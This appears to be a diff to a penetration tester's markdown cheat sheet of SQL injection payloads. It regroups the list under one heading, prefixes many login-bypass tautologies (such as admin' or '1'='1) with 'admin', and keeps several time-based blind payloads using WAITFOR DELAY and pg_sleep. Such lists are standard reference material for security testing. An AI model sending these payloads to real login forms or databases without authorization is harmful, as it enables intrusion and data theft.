@@ -58,7 +58,7 @@ mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
 
 ---
 ## SQLi Payloads
-### QUICK
+### QUICK PAYLOADS - [more payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
 
 ```sql
 -- Discover SQLi with these 5 (URL encode also): ---
@@ -69,40 +69,34 @@ mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
 )
 -- Payloads -- 
 admin' or '1'='1
-' or '1'='1
-" or "1"="1
-" or "1"="1"--
-" or "1"="1"/*
-" or "1"="1"#
-" or 1=1
-" or 1=1 --
-" or 1=1 -
-" or 1=1--
-" or 1=1/*
-" or 1=1#
-" or 1=1-
-") or "1"="1
-") or "1"="1"--
-") or "1"="1"/*
-") or "1"="1"#
-") or ("1"="1
-") or ("1"="1"--
-") or ("1"="1"/*
-") or ("1"="1"#
-) or '1\`='1-
-'
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or "1"="1"#
+admin" or 1=1
+admin" or 1=1 --
+admin" or 1=1 -
+admin" or 1=1--
+admin" or 1=1/*
+admin" or 1=1#
+admin" or 1=1-
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or "1"="1"#
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin") or ("1"="1"#
+admin) or '1`='1-
+admin'
 administrator'
-' OR 1=1--
-'; waitfor delay ('0:0:20')--
-'; IF (1=2) WAITFOR DELAY '0:0:10'
-'; IF (1=1) WAITFOR DELAY '0:0:10'
-'||pg_sleep(10)--
-'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
-```
-
-### AUTH BYPASS
-
-```SQL
+admin' OR 1=1--
+admin'; waitfor delay ('0:0:20')--
+admin'; IF (1=2) WAITFOR DELAY '0:0:10'
+admin'; IF (1=1) WAITFOR DELAY '0:0:10'
+admin'||pg_sleep(10)--
+admin'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 '-'
 ' '
 '&'
@@ -125,7 +119,6 @@ administrator'
 "*"
 '--'
 "--"
-'--' / "--"
 " or ""-"
 " or "" "
 " or ""&"
@@ -159,12 +152,10 @@ admin') or 2 LIKE 2--
 admin') or ('2' LIKE '2
 admin') or ('2' LIKE '2'#
 admin') or ('2' LIKE '2'/*
-admin' or '1'='1
 admin' or '1'='1'--
 admin' or '1'='1'#
 admin' or '1'='1'/*
 admin'or 1=1 or ''='
-admin' or 1=1
 admin' or 1=1--
 admin' or 1=1#
 admin' or 1=1/*
